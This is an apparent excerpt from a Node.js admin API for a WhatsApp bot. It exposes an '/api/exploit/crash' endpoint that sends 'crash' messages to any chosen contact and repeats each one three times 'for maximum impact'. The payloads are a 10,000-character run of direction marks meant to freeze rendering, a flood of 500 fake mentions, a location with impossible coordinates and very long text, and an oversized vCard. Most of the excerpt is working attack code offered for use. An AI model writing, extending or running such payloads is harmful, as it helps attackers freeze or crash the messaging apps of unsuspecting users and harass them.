...
function startAdminApi() {
    ...
    app.post('/api/exploit/crash', async (req, res) => {
        ...
        try {
            console.log(`🚀 [EXPLOIT] Sending ${type} crash to ${jid} from ${sessionPhone || 'default'}`);
            
            let payload = {};
            
            switch (type) {
                case 'unicode_overflow':
                    // Massive string of RTL/LTR characters to freeze rendering
                    const heavyChar = '\u200E\u200F'.repeat(5000);
                    payload = { text: `🔥 MAZARI CRASH 🔥\n${heavyChar}` };
                    break;
                    
                case 'jid_flood':
                    // Mention flood with many fake JIDs
                    const mentions = [];
                    for (let i = 0; i < 500; i++) {
                        mentions.push(`92300${Math.floor(Math.random() * 9999999)}@s.whatsapp.net`);
                    }
                    payload = { 
                ...
                case 'location_crash':
                    // Malformed location with extreme coordinates
                    payload = {
                        location: {
                            degreesLatitude: 999999.99,
                            degreesLongitude: 999999.99,
                            name: 'MAZARI EXPLOIT'.repeat(100),
                            address: 'CRASH'.repeat(500)
                        }
                    };
                    break;
                    
                case 'vcard_crash':
                    // Massive VCard payload
                    const vcard = 'BEGIN:VCARD\nVERSION:3.0\n' + 
                        `FN:${'☠️'.repeat(500)}\n` + 
                        `ORG:${'MAZARI'.repeat(500)};\n` + 
                        `TEL;type=CELL;type=VOICE;waid=923232391033:+92 323 2391033\n` + 
                        'END:VCARD';
                    payload = {
                        contacts: {
                            displayName: 'MAZARI CRASH',
                            contacts: [{ vcard }]
                        }
                    };
                    break;
            ...
            // Send multiple times for maximum impact
            for (let i = 0; i < 3; i++) {
                await sock.sendMessage(jid, payload);
                await new Promise(r => setTimeout(r, 500));
            }

            res.json({ success: true, message: `${type} payload sent successfully to ${jid}!` });
        } catch (error) {
